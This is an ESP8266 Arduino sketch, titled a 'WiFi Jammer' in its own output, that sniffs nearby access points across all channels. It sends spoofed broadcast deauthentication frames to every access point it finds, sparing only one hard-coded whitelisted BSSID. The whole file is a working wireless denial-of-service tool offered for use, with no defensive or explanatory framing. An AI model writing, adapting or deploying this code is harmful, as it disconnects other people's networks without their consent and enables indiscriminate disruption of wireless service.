#ifdef ESP8266

#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}

#define MAX_APS 100
#define CHANNELS 14

// Whitelist only this MAC address (BSSID)
uint8_t whitelistBSSID[6] = {0x9C, 0x53, 0x22, 0xE7, 0x2F, 0x07};

struct AP {
  uint8_t bssid[6];
  int channel;
};

AP aps[MAX_APS];
int apCount = 0;

int currentChannel = 1;

unsigned long lastSwitch = 0;
unsigned long switchInterval = 100; // milliseconds channel switch time

uint8_t deauthPacket[26] = {
  0xc0, 0x00,
  0x00, 0x00,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x07, 0x00
};

bool isWhitelistedBSSID(uint8_t *bssid) {
  for (int i = 0; i < 6; i++) {
    if (bssid[i] != whitelistBSSID[i]) {
      return false;
    }
  }
  return true;
}

void ICACHE_RAM_ATTR sniffer_callback(uint8_t *buf, uint16_t len) {
  if (len < 36) return;
  uint8_t *bssid = buf + 16;

  for (int i = 0; i < apCount; i++) {
    if (memcmp(aps[i].bssid, bssid, 6) == 0) return;
  }

  if (apCount < MAX_APS) {
    memcpy(aps[apCount].bssid, bssid, 6);
    aps[apCount].channel = currentChannel;
    apCount++;
  }
}

void printBSSID(uint8_t *bssid) {
  for (int i = 0; i < 6; i++) {
    if (bssid[i] < 0x10) Serial.print("0");
    Serial.print(bssid[i], HEX);
    if (i < 5) Serial.print(":");
  }
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(sniffer_callback);
  wifi_promiscuous_enable(1);
  Serial.println("Starting WiFi Jammer...");
}

void loop() {
  unsigned long now = millis();

  if (now - lastSwitch > switchInterval) {
    currentChannel++;
    if (currentChannel > CHANNELS) currentChannel = 1;
    wifi_set_channel(currentChannel);
    lastSwitch = now;
  }

  for (int i = 0; i < apCount; i++) {
    if (isWhitelistedBSSID(aps[i].bssid)) {
      Serial.print("Skipping whitelisted BSSID: ");
      printBSSID(aps[i].bssid);
      Serial.println();
      continue;
    }
    Serial.print("Jamming BSSID: ");
    printBSSID(aps[i].bssid);
    Serial.print(" on Channel: ");
    Serial.println(aps[i].channel);

    wifi_set_channel(aps[i].channel);
    memcpy(&deauthPacket[10], aps[i].bssid, 6);
    memcpy(&deauthPacket[16], aps[i].bssid, 6);
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    delay(1);
  }
}

#endif
